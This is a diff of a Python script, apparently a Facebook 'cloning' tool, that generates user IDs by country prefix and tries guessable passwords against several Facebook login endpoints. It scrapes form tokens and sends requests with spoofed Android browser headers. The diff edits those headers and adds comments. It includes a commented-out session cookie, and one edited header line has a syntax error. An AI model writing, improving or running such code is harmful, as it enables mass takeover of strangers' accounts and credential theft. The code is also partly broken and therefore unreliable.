@@ -1,4 +1,10 @@
-#created by ANOX 
+#created by ANOX aka country chaudhary
+#open source by ANOX
+#github= ANOX-XD
+#BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
+#JAI NEPAL
+# fb id https://www.facebook.com/acountry.chaudhary69
+
 
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
@@ -1240,12 +1246,12 @@ def ANOX():
     print("\033[1;33m [💘]✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼")
     print("\033[1;37m [1] NEPAL CLONING\n\033[1;36m [2] INDIA CLONING\n\033[1;33m [3] PAKISTAN CLONING \n\033[1;36m [4] BANGLADESH CLONING \n\033[1;37m [5] AFGHANISTAN CLONING \n")
     print(49*'=')
-    method = input("✓CHOOSE>")
-    if method =='1':ANOX1()
-    elif method =='2':ANOX2()
-    elif method =='3':ANOX3()
-    elif method =='4':ANOX4()
-    elif method =='5':ANOX5()
+    country = input("✓CHOOSE>")
+    if country =='1':ANOX1()
+    elif country =='2':ANOX2()
+    elif country =='3':ANOX3()
+    elif country =='4':ANOX4()
+    elif country =='5':ANOX5()
     else:
         print("SELECT CORRECT OPTION")
         ANOX()
@@ -1364,7 +1370,7 @@ def ANOX2():
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
-			pwx = [guru]
+			pwx = ['59039200']
 			pwx = [kode+guru,mk,'57273200']
 			
 
@@ -1606,6 +1612,7 @@ def mbasic(uid,pwx,tl):
 			session = requests.Session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://mbasic.facebook.com').text
+			#method MBASIC
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1684,6 +1691,7 @@ def p(uid,pwx,tl):
 			session = requests.Session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://p.facebook.com').text
+#METHOD P
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1770,27 +1778,28 @@ def x(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'Host': 'free.facebook.com',
+			header_freefb = {'Host': 'free.facebook.com',#FREE METHOD 
             'method':'POST',
             'scheme':'https',
+    'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'dpr': '2',
-    'referer': 'https://x.facebook.com/',
+    # 'cookie': 'datr=3XOQZbE_7TrxZfBpBBSrrvLb; sb=3XOQZUxRpAqUvuRhMS8caYbJ; m_pixel_ratio=2.75; wd=393x720; fr=0P7haYQ8gqgcvw8JW..BlkHPd.BM.AAA.0.0.BlkHQO.AWVY9lxQjpg',
+    'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X680D"',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',,}
 			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -1852,23 +1861,25 @@ def mobile(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {'authority': 'x.facebook.com',
+			'method':'POST',
+            'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'dpr': '2',
+    'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X680D"',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POCO F1 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
 			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -1920,6 +1931,7 @@ def free(uid,pwx,tl):
 			session = requests.Session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
+#FREE method 
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1999,6 +2011,7 @@ def d(uid,pwx,tl):
 			session = requests.Session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://d.facebook.com').text
+#D method
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
